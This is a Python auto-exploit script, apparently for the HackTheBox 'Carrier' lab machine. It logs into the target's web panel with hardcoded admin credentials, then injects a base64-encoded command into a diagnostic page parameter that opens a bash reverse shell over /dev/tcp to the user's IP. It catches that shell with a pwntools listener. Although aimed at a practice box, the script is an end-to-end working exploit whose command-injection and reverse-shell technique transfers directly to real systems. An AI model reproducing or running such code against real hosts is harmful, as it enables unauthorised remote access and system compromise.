
import requests
import base64
import time

print('''   _                            _                 _      _ _  _   ''')
time.sleep(0.1)
print('''  (_) __ _  __ _  __ _  ___  __| |_ __ ___  _   _| | ___/ | || |  ''')
time.sleep(0.1)
print('''  | |/ _` |/ _` |/ _` |/ _ \/ _` | '_ ` _ \| | | | |/ _ \ | || |_ ''')
time.sleep(0.1)
print('''  | | (_| | (_| | (_| |  __/ (_| | | | | | | |_| | |  __/ |__   _|''')
time.sleep(0.1)
print(''' _/ |\__,_|\__, |\__, |\___|\__,_|_| |_| |_|\__,_|_|\___|_|  |_|  ''')
time.sleep(0.1)
print('''|__/       |___/ |___/                                            ''')
time.sleep(0.1)

print('JAGGEDMULE14 - CARRIER HACKTHEBOX AUTOINTRUDER\n')

ip = input('Introduce tu IP (tun0): ')
port = int(input('Puerto con el que quieras romper la mamona\n\n[!]IMPORTANTE\nSi el puerto que quieres está por debajo del 1024 requeriras ejecutar este script como root\nrecomiendo un puerto superior al 1024\n\nIntroduce tu puerto: '))

from pwn import *

def def_handler(sig, frame):
    print('[-]Exit')
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def ping(host):
    response = os.system(f'ping -c 1 {host} >/dev/null 2>&1')
    if response == 0:
        return True

    else:
        return False

if ping('10.10.10.105') == False:
    print('[-]Conexión con la máquina fallida')
    time.sleep(0.5)
    print('[-]La máquina está activa?')
    time.sleep(0.5)
    print('[-]Intenta ejecutar el script de nuevo')
    sys.exit(1)


if ping('10.10.10.105') == True:
    time.sleep(0.1)
    print('[+]Conexión Exitosa')
    url = requests.get('http://10.10.10.105')
    
    if url.status_code == 200:
        time.sleep(0.5)
        print(f'[+]HTTP/{url.status_code} OK')
        time.sleep(0.5)
        print('[+]Logueandose')
        logurl = "http://10.10.10.105"
        c = requests.session()
        AuthData = {'username' : 'admin', 'password' : 'NET_45JDX23'}
        r = c.post(logurl, data=AuthData)
        
        if "Dashboard" in r.text:
            time.sleep(0.5)
            print('[+]Inyectando comando...')
            
            def test():
                print('[+]Conectando...')
                message = f'; /bin/bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"'
                message_bytes = message.encode('ascii')
                base64_bytes = base64.b64encode(message_bytes)
                base64_message = base64_bytes.decode('ascii')
                codeurl = "http://10.10.10.105/diag.php"
                datacode = {'check' : base64_message}
                c.post(codeurl, data=datacode)
        
            try:                
                threading.Thread(target=test).start()

            except Exception as e:
                print(f'[-]{e}')                       

            shellc = listen(port, timeout=5).wait_for_connection()

            if shellc.sock is None:
                print('[-]Conexión fallida')
                sys.exit(1)

            else:
                time.sleep(0.5)
                print('[+]Inyección de comandos exitosa')
            shellc.interactive()
        
        else:
            print('[-]Algo salió mal logueandose')
            sys.exit(1)
    else:
        print(f'[-]Algo salió mal')
        time.sleep(0.5)
        print(f'[-]HTTP/{url.status_code}')
        sys.exit(1)
